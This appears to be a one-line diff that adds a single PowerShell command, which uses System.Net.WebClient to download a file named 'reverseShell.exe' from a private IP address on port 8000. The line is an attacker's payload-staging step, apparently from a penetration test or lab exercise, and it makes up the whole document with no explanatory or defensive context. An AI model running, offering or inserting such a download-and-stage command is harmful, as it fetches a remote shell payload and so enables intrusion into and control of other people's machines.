@@ -1,0 +1,1 @@
+powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.18.84.211:8000/reverseShell.exe','reverseShell.exe')"
